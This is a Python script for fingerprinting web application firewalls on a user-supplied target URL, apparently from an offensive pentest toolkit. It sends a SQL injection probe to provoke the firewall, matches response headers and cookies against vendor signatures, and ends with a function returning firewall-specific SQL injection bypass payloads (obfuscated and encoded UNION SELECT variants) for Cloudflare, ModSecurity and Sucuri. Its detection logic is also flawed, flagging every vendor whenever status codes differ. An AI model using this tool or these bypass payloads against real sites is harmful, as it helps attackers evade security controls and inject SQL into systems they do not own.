import requests
from colorama import Fore, Style
import json
import os

WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "__cfduid"],
        "server": ["cloudflare"],
        "cookies": ["__cfduid"]
    },
    "ModSecurity": {
        "headers": ["mod_security", "mod_security_version"],
        "server": ["mod_security"]
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "server": ["sucuri"]
    },
    "Imperva": {
        "headers": ["x-iinfo", "x-cdn"],
        "server": ["imperva"]
    },
    "Akamai": {
        "headers": ["x-akamai-transformed", "akamai-origin-hop"],
        "server": ["akamai"]
    },
    "F5 BIG-IP": {
        "headers": ["x-cnection", "x-wa-info"],
        "cookies": ["BIGipServer"]
    },
    "AWS WAF": {
        "headers": ["x-amz-cf-id", "x-amz-id-2"],
        "server": ["awselb/2.0"]
    }
}

def detect_waf():
    print(Fore.CYAN + "\n=== WAF Detection Tool ===\n")
    
    url = input(Fore.GREEN + "Enter the target URL: " + Style.RESET_ALL)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print(Fore.YELLOW + "\nSending requests to detect WAF...")
    
    try:
        # Normal request
        response = requests.get(url, timeout=10)
        
        # Request with suspicious payload to trigger WAF
        malicious_payload = "' OR '1'='1' --"
        response_mal = requests.get(f"{url}?id={malicious_payload}", timeout=10)
        
        detected_wafs = []
        
        # Check headers, server, and cookies against signatures
        for waf_name, signatures in WAF_SIGNATURES.items():
            detected = False
            
            # Check headers
            if "headers" in signatures:
                for header in signatures["headers"]:
                    if header.lower() in [h.lower() for h in response.headers.keys()]:
                        detected = True
                        break
            
            # Check server header
            if "server" in signatures and "server" in response.headers:
                for server in signatures["server"]:
                    if server.lower() in response.headers["server"].lower():
                        detected = True
                        break
            
            # Check cookies
            if "cookies" in signatures and response.cookies:
                for cookie in signatures["cookies"]:
                    if any(cookie.lower() in c.lower() for c in response.cookies.keys()):
                        detected = True
                        break
            
            # Check for WAF behavior (different responses)
            if response.status_code != response_mal.status_code:
                detected = True
            
            if detected:
                detected_wafs.append(waf_name)
        
        if detected_wafs:
            print(Fore.RED + "\n[!] WAF(s) Detected:")
            for waf in detected_wafs:
                print(Fore.RED + f"[+] {waf}")
                
            # Save results
            if not os.path.exists("data/results"):
                os.makedirs("data/results")
            
            result = {
                "url": url,
                "detected_wafs": detected_wafs,
                "headers": dict(response.headers),
                "status_code": response.status_code
            }
            
            with open("data/results/waf_detection.json", "a") as f:
                f.write(json.dumps(result, indent=2) + "\n")
                
            print(Fore.GREEN + "\n[+] Results saved to data/results/waf_detection.json")
            
            return detected_wafs
            
        else:
            print(Fore.GREEN + "\n[+] No WAF detected or WAF is well-hidden")
            return []
            
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"\nError: {str(e)}")
        return []

def get_bypass_payloads(waf_name):
    """Return WAF-specific SQL injection bypass payloads"""
    bypass_payloads = {
        "Cloudflare": [
            "/*!50000UnIoN*/",
            "/*!50000SeLeCt*/",
            "/*!50000union*//*!50000select*/",
            "+'union'+select+'1',+'2'--+-",
            "%23%0Aunion%23%0Aselect%23%0A1,2--+-"
        ],
        "ModSecurity": [
            "/*!12345UNION SELECT*/",
            "/*!50000UNION*//*!50000SELECT*/",
            "/*!12345UNION*//*!12345SELECT*/",
            "+UnIoN/*&a=*/SeLeCT/*&a=*/",
            "%0AunION%0AsEleCt"
        ],
        "Sucuri": [
            "/*!50000%75%6e%69%6f%6e*/ /*!50000%73%65%6c%65%63%74*/",
            "%75%6e%69%6f%6e %73%65%6c%65%63%74",
            "un?on sel?ct",
            "/*!12345UnIoN*//*!12345sElEcT*/",
            "/**//*!12345UNION SELECT*//**/"
        ]
    }
    
    return bypass_payloads.get(waf_name, []) 